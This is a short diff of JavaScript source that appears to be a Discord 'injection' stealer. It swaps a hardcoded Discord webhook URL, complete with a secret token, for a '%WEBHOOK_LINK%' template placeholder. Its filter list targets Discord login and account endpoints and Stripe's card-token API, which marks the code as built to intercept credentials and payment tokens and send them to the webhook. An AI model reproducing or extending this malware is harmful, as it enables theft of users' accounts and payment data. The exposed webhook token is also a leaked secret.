@@ -7,7 +7,7 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "https://discord.com/api/webhooks/1005201712514089070/MWUJTGDn-ItSRs490CeyaIy5dnI5ERwtTD0h_YOsPA-Nf917B7L_4cHzmojsPGmoh8xM"
+const webhook = "%WEBHOOK_LINK%"
 const Filters = {
     1: {
         urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
